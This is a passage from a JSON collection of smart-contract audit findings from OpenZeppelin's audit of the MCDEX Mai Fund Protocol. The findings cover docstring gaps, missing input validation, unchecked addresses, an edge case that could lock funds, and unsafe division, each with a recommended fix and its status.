      "content": "Although most of the functions in the codebase have relevant docstrings, there are some instances where the docstrings are misleading, incomplete or missing. For example:\n\n\n* The docstrings above the [`rebalanceTarget` function](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/implement/AutoTradingFund.sol#L102) in the `AutoTradingFund` contract says that the function `Return true if rebalance is needed`. It does not mention anything about the remaining two return variables `amount` and `side`.\n* The docstrings above the [`_performanceFee` function](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/component/Fee.sol#L100) in the `Fee` contract implies that there are two parts of the performance fee calculation, when in reality there is only one.\n* [`index`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/lib/LibEnumerableMap.sol#L73-L75), [`previous`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/lib/LibEnumerableMap.sol#L77-L83) and [`findLastNonZeroValue`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/lib/LibEnumerableMap.sol#L85-L100) functions in the `LibEnumerableMap` library are missing docstrings. All other functions within `LibEnumberableMap` have descriptive docstrings.\n\n\nConsider changing the identified misleading or incomplete docstrings to better reflect the codes behavior. Additionally, consider adding docstrings wherever relevant. When writing docstrings, consider following the [Ethereum Natural Specification Format (NatSpec)](https://solidity.readthedocs.io/en/v0.6.10/natspec-format.html).\n\n\n**Update:** *Fixed in [PR #11](https://github.com/mcdexio/mai-fund-protocol/pull/11) and [PR #14](https://github.com/mcdexio/mai-fund-protocol/pull/14).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Fund Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-fund-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11268",
      "title": "[L05] _seperators values not checked",
      "impact": "LOW",
      "content": "Within the [`RSITrendingStrategy` contract](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/RSITrendingStrategy.sol), the [array `_seperators`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/RSITrendingStrategy.sol#L29) is [set within the `constructor`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/RSITrendingStrategy.sol#L71), but the values within it are never checked.\n\n\nAlthough there is a [comment](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/RSITrendingStrategy.sol#L36) indicating that `_seperators` should be monotonically increasing, it is easily possible for it not to be. If a value at index `n+1` is less than the value at index `n`, that value of `_seperators` will [never result in usage](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/RSITrendingStrategy.sol#L87) and is effectively wasted space. Additionally, the max possible value of `_seperators` is not limited, but since it is compared to [`rsi`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/RSITrendingStrategy.sol#L84), it is pointless to have [any values greater than the max value of `rsi`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/RSITrendingStrategy.sol#L87).\n\n\nConsider checking the values of `_seperators` to ensure that they are monotonically increasing and that they do not exceed [`RSI_UPPERBOUND`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/RSIReader.sol#L24) (the max value for `rsi`). Alternatively, consider adding to the comment on [line 36](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/RSITrendingStrategy.sol#L36) that `_seperators` should never be greater than `RSI_UPPERBOUND`, and making this clear in the documentation as well.\n\n\n**Update:** *Fixed in [PR #13](https://github.com/mcdexio/mai-fund-protocol/pull/13).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Fund Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-fund-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11267",
      "title": "[L04] addBucket has no upper bound on input",
      "impact": "LOW",
      "content": "The function [`addBucket` within the `PeriodicPriceBucket` contract](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/PeriodicPriceBucket.sol#L84) adds a value to the the [`_periods` enumerable set](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/PeriodicPriceBucket.sol#L90). If this value is too high, when it is later [accessed](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/PeriodicPriceBucket.sol#L129) and [used to calculate `periodIndex`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/PeriodicPriceBucket.sol#L130), `periodIndex` may evaluate to `0`, causing [`_firstPeriodIndexes[period]` to be set to `0` and event `FirstIndex` to be emitted multiple times](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/PeriodicPriceBucket.sol#L132-L138).\n\n\nConsider adding an upper bound on [`period`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/PeriodicPriceBucket.sol#L84) within `addBucket` such that for reasonable values of [`newTimestamp`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/PeriodicPriceBucket.sol#L130), `periodIndex` will be greater than 0.\n\n\n**Update:** *Fixed in [PR #12](https://github.com/mcdexio/mai-fund-protocol/pull/12).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Fund Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-fund-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11266",
      "title": "[L03] rebalanceTarget may return undefined values",
      "impact": "LOW",
      "content": "Within the [`AutoTradingFund` contract](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/implement/AutoTradingFund.sol), the [`rebalanceTarget`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/implement/AutoTradingFund.sol#L102) function will return `0` for [`amount`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/implement/AutoTradingFund.sol#L104) and [`Side.FLAT`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/lib/LibTypes.sol#L5) for `side` if [`needRebalance` is false](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/implement/AutoTradingFund.sol#L110), as the values for `amount` and `side` are only set [within the `if` branch where `needRebalance` is true](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/implement/AutoTradingFund.sol#L110-L111).\n\n\nWithin the audited codebase, `rebalanceTarget` is only called [from one place](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/implement/AutoTradingFund.sol#L139), and it is immediately followed by a [`require` that `needRebalance == true`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/implement/AutoTradingFund.sol#L140). So, in the case that `needRebalance` is `false`, execution will revert and state will not be affected.\n\n\nIn case future use of `needRebalance` is desired, consider implementing some default value for `amount` and `side`, and making a note of this in comments above the function. Otherwise, the function may behave unexpectedly for future developers.\n\n\n**Update:** *Fixed in [PR #11](https://github.com/mcdexio/mai-fund-protocol/pull/11).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Fund Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-fund-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11265",
      "title": "[L02] In RSITrendingStrategy, _transfers and _seperators can be set only once",
      "impact": "LOW",
      "content": "Within the [`RSITrendingStrategy` contract](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/RSITrendingStrategy.sol), the values of [`_seperators`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/RSITrendingStrategy.sol#L71) and [`_transfers`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/RSITrendingStrategy.sol#L69) are set in the `constructor`. Once set, these values cannot be changed. Furthermore, since `_transfers` is set within a [`for` loop](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/RSITrendingStrategy.sol#L61), there is a non-negligible chance that calling the constructor with too large of a [`transferEntries` array](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/RSITrendingStrategy.sol#L61) could cause execution to run out of gas and revert.\n\n\nIn the case that some entry of `_transfers` is not set, but later [accessed](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/RSITrendingStrategy.sol#L95) by the [`getNextTarget` function](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/RSITrendingStrategy.sol#L83), that entry would return `0`, which may be treated as a valid target. For example, in the [`_nextTargetLeverage` function](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/implement/AutoTradingFund.sol#L151) of `AutoTradingFund` contract, a value of `0` may be interpreted as the [`nextTargetLeverage`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/implement/AutoTradingFund.sol#L155). This may happen if the user creating `RSITrendingStrategy` leaves some value out of `transferEntries`, by mistake or to save gas.\n\n\nConsider creating some methods to change `_transfers` after the constructor has been called, perhaps also adding a flag which prevents the `getNextTarget` method from being successfully called until `_transfers` has been fully set and committed. Alternatively, consider informing users of `RSITrendingStrategy` that there is a limit to the number of `_transfer` elements which can be set, and that unset values will be interpreted as valid `0` values. Otherwise, errors or misconceptions about the code may be unchangeable and result in unexpected behavior.\n\n\n**Update:** *Fixed in [PR #10](https://github.com/mcdexio/mai-fund-protocol/pull/10). The Monte Carlo team has decided to make the strategy replaceable.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Fund Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-fund-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11264",
      "title": "[L01] Inaccessible elements can be added to _transfers",
      "impact": "LOW",
      "content": "Within the [`RSITrendingStrategy` contract](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/RSITrendingStrategy.sol), the [`constructor` sets values in the `_transfers` mapping](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/RSITrendingStrategy.sol#L69). The indices for both dimensions of each element [must be less than or equal to `maxSegment`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/RSITrendingStrategy.sol#L62-L63). [`maxSegment`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/RSITrendingStrategy.sol#L60) is set to the length of `_seperators + 1`. Thus, the max value for either index of `_transfers` is `_seperators.length + 1`.\n\n\nThe only place where `_transfers` is accessed is [within `getNextTarget`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/RSITrendingStrategy.sol#L95). There, [`segment` must be less than or equal to `_seperators.length`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/RSITrendingStrategy.sol#L85-L88), and [`_lastSegment` must be a valid segment](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/RSITrendingStrategy.sol#L92-L93) (meaning that it is also [equal to or less than `_seperators.length`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/RSITrendingStrategy.sol#L76)). If it is not, [`_lastSegment` is set to `segment`s value](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/RSITrendingStrategy.sol#L93). In all cases, `_lastSegment` and `segment` can never equal `maxSegment`, meaning that any elements in `_transfers` which [have `maxSegment` as an index](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/RSITrendingStrategy.sol#L69) will never be used.\n\n\nConsider changing the condition on [lines 62 and 63 of `RSITrendingStrategy` contract](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/RSITrendingStrategy.sol#L62-L63) to be `&lt;` instead of `&lt;=`.\n\n\n**Update:** *Fixed in [PR #9](https://github.com/mcdexio/mai-fund-protocol/pull/9).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Fund Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-fund-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11263",
      "title": "[M06] Unchecked address used to instantiate contract",
      "impact": "MEDIUM",
      "content": "In [the `initialize` function](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/implement/AutoTradingFund.sol#L41-L55) of the `AutoTradingFund` contract, the [value of `strategyAddress` address is input by the user](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/implement/AutoTradingFund.sol#L47). This address is later [used to instantiate the `ITradingStrategy` interface](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/implement/AutoTradingFund.sol#L64). However, there is no validation in the system to check if the `strategyAddress` address is an address of a contract or a zero address.\n\n\nIf an incorrect address is used to instantiate the `ITradingStrategy` interface, the calls to [the `_nextTargetLeverage` function](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/implement/AutoTradingFund.sol#L151-L160) [will revert](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/implement/AutoTradingFund.sol#L155) which in-turn [affects the rebalancing of the funds positions](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/implement/AutoTradingFund.sol#L107).\n\n\nAdditionally, the `perpetualAddress` address is input by the user in [the `initialize` function](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/implement/AutoTradingFund.sol#L45) of the `AutoTradingFund` contract and [the `initialize` function](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/implement/SocialTradingFund.sol#L35) of the `SocialTradingFund` contract. These functions in turn call [the `__SettleableFund_init` function](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/SettleableFund.sol#L29-L48) in the `SettleableFund` contract, which then [calls](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/SettleableFund.sol#L43) the `__MarginAccount_init_unchained` function in the `MarginAccount` contract. Within [the `__MarginAccount_init_unchained` function](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/component/MarginAccount.sol#L30-L36), the value of `perpetualAddress` address is used to [instantiate the `IPerpetual` interface](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/component/MarginAccount.sol#L35). Although, this function checks that [the `perpetualAddress` address should not be a zero address](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/component/MarginAccount.sol#L34), there is no validation that `perpetualAddress` address is a contract and not an Externally Owned Account address.\n\n\nSimilarly, [the `_setPriceFeeder` function](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/PeriodicPriceBucket.sol#L192-L199) in the `PeriodicPriceBucket` contract takes [`newPriceFeeder` address as an input](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/PeriodicPriceBucket.sol#L192), [checks if the address is not a zero address](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/PeriodicPriceBucket.sol#L195) and [instantiates the `IPriceFeeder` interface](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/PeriodicPriceBucket.sol#L198). This function also fails to validate if `newPriceFeeder` address is a contract address. Another example of the same is the [`priceSeriesRetriever` address](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/RSIReader.sol#L36-L45) in the `RSIReader` contract which [instantiates the `IPriceSeriesRetriever` interface](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/RSIReader.sol#L43).\n\n\nConsider checking that [`strategyAddress`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/implement/AutoTradingFund.sol#L58) is not a zero address. Additionally, consider checking that [`strategyAddress`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/implement/AutoTradingFund.sol#L58), [`perpetualAddress`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/component/MarginAccount.sol#L30), [`newPriceFeeder`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/PeriodicPriceBucket.sol#L192) and [`priceSeriesRetriever`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/RSIReader.sol#L36) addresses are indeed contracts by using [the `isContract` function](https://docs.openzeppelin.com/contracts/3.x/api/utils#Address-isContract-address-) provided in the OpenZeppelin `contracts` Address library.\n\n\n**Update:** *Fixed in [PR #8](https://github.com/mcdexio/mai-fund-protocol/pull/8).*",
      "summary": "\nThis bug report is about a problem in the `AutoTradingFund`, `SocialTradingFund`, `SettleableFund`, and `MarginAccount` contracts, as well as the `PeriodicPriceBucket` and `RSIReader` contracts. The issue is that when certain addresses are input by the user, there is no validation to check if the address is an address of a contract or a zero address. This could lead to calls to certain functions reverting, which in turn affects the rebalancing of the funds positions.\n\nThe `initialize` function of the `AutoTradingFund` contract takes the value of `strategyAddress` address as input, which is later used to instantiate the `ITradingStrategy` interface. The `initialize` function of the `SocialTradingFund` contract takes the `perpetualAddress` address as input, which is used to instantiate the `IPerpetual` interface. The `_setPriceFeeder` function in the `PeriodicPriceBucket` contract takes `newPriceFeeder` address as an input, and the `priceSeriesRetriever` address in the `RSIReader` contract is used to instantiate the `IPriceSeriesRetriever` interface. However, none of these functions check that the address is a contract address.\n\nTo fix this issue, consider checking that the addresses are not zero addresses, and that they are indeed contracts by using the `isContract` function provided in the OpenZeppelin `contracts` Address library. This has been fixed in PR #8.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Fund Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-fund-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11262",
      "title": "[M05] In certain edge case, funds can get locked",
      "impact": "MEDIUM",
      "content": "In the case that the [`marginBalance`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/component/MarginAccount.sol#L120) of a fund ends up being [less than 0](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/component/MarginAccount.sol#L121), the `totalAssetValue()` function will revert. If this happens, many functions which rely on `_totalAssetValue()` will be locked, resulting in reverts whenever they are called. Some of these functions are:\n\n\n* `BaseFund.purchase()`\n* `BaseFund.redeem()`\n* `BaseFund.bidRedeemingShare()`\n* `Getter.netASsetValue()`\n* `Getter.netAssetValuePerShare()`\n* `Getter.leverage()`\n* `Getter.drawdown()`\n* `SettleableFund._canShutdown()`\n* `AutoTradingFund.rebalanceTarget()`\n* `SocialTradingFund.managementFee()`\n* `SocialTradingFund._withdrawManagementFee()`\n* `SocialTradingFund.updateManagementFee()`\n* `SettleableFund.setShutdown()`\n\n\nSome notable side effects are that users will not be able to withdraw or shut the fund down.\n\n\nHowever, this is an edge case which relies on the fund not being liquidated within the Mai Protocol, and the fund not being shut down after the [`_drawdownHighWaterMark` has been reached](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/fund/SettleableFund.sol#L117). Note that both of these actions are intended behaviors that should happen far before the funds `marginBalance` goes negative.\n\n\nIn times when network congestion is high or in times of extreme asset volatility, this could occur. We report this to make users aware of a possible (but unlikely) risk of using the Mai Fund Protocol. Consider making this risk apparent in the documentation, and establishing a contingency plan to prevent locking funds should this state ever be reached.\n\n\n**Update:** *Acknowledged. The MonteCarlo team states that the maintenance of the margin account is one of the most important mechanisms of Mai Protocol V2. A users margin account would be liquidated before its value could go below maintenance margin, which is always greater than 0.*",
      "summary": "\nA bug has been identified in the Mai Fund Protocol, where if the marginBalance of a fund is less than 0, the totalAssetValue() function will revert. This means that many functions which rely on this function, such as purchase(), redeem(), netAssetValue(), leverage(), drawdown(), and more, will also be locked and revert when called. This could prevent users from withdrawing or shutting down the fund. This is an edge case which relies on the fund not being liquidated or shut down when the _drawdownHighWaterMark is reached, and could occur during times of network congestion or extreme asset volatility. The MonteCarlo team has acknowledged this bug and stated that the maintenance of the margin account is one of the most important mechanisms of Mai Protocol V2, and that a users margin account would be liquidated before its value could go below maintenance margin. It is recommended that this risk be made apparent in the documentation and that a contingency plan be established to prevent locking funds should this state ever be reached.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Fund Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-fund-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11261",
      "title": "[M04] No check on newTimestamp value from _priceFeeder",
      "impact": "MEDIUM",
      "content": "Within the `updatePrice` function in the [`PeriodicPriceBucket` contract](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/PeriodicPriceBucket.sol), the values of [`newPrice` and `newTimestamp` are returned](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/PeriodicPriceBucket.sol#L122-L125) when [`priceFeeder.price()`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/PeriodicPriceBucket.sol#L126) is called. While the system [checks for an invalid value of `newPrice`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/PeriodicPriceBucket.sol#L126), there is no check for invalid value of `newTimestamp`.\n\n\nAn invalid value of [`newTimestamp` impacts the value of `periodIndex` variable](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/PeriodicPriceBucket.sol#L130). The case of `periodIndex == 0` is [explicitly stated to cause problems, but is chosen to be ignored](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/PeriodicPriceBucket.sol#L133-L136). However, if there is any error or unexpected execution in `_priceFeeder.price()`, the value of `newTimestamp` might be `0`. This will [result in `periodIndex` being `0`](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/oracle/PeriodicPriceBucket.sol#L130).\n\n\nTo avoid this edge case, consider adding a check which requires that `newTimestamp &gt; 0`.\n\n\n**Update:** *Fixed in [PR #7](https://github.com/mcdexio/mai-fund-protocol/pull/7).*",
      "summary": "\nA bug has been identified in the `updatePrice` function of the `PeriodicPriceBucket` contract. This function is used to return values of `newPrice` and `newTimestamp` when `priceFeeder.price()` is called. The system checks for an invalid value of `newPrice`, however, there is no check for an invalid value of `newTimestamp`.  \n\nThis could cause an issue as an invalid value of `newTimestamp` impacts the value of `periodIndex` variable, which is explicitly stated to cause problems. If there is an error or unexpected execution in `_priceFeeder.price()`, the value of `newTimestamp` might be `0`, resulting in `periodIndex` being `0`.\n\nTo avoid this edge case, a check should be added to require that `newTimestamp > 0`. This has been fixed in PR #7.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Fund Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-fund-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11260",
      "title": "[M03] Unsafe divisions in LibMathEx",
      "impact": "MEDIUM",
      "content": "The function [`wdiv` on line 19](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/lib/LibMathEx.sol#L19) and function [`wdiv` on line 32](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/lib/LibMathEx.sol#L32) of the [`LibMathEx` library](https://github.com/mcdexio/mai-fund-protocol/blob/98af0d1d7e9872ba2b5e734e2a43c161ef635608/contracts/lib/LibMathEx.sol), accepts the divisor `y` as an input parameter. However, these functions do not check if the value of `y` is zero.\n\n\nIf the value passed for `y` is `0`, the division will revert due to the division by zero. To prevent such unsafe calculations, consider using the `div` functions provided in OpenZeppelins [`SignedSafeMath`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/de99bccbfd4ecd19d7369d01b070aa72c64423c9/contracts/math/SignedSafeMath.sol#L50) and [`SafeMath`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/de99bccbfd4ecd19d7369d01b070aa72c64423c9/contracts/math/SafeMath.sol#L103) libraries, instead of direct division via the `/` operator.\n\n\n**Update:** *Fixed in [PR #6](https://github.com/mcdexio/mai-fund-protocol/pull/6).*",
      "summary": "\nThis bug report is about the functions `wdiv` on line 19 and 32 of the `LibMathEx` library in the mcdexio/mai-fund-protocol repository. These functions accept the divisor `y` as an input parameter, but do not check if the value of `y` is zero. If the value passed for `y` is zero, the division will revert due to the division by zero. To prevent this issue, the OpenZeppelins `SignedSafeMath` and `SafeMath` libraries should be used instead of direct division via the `/` operator. The bug has been fixed in PR #6.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Fund Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-fund-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11259",
      "title": "[M02] Lack of SafeMath",
      "impact": "MEDIUM",
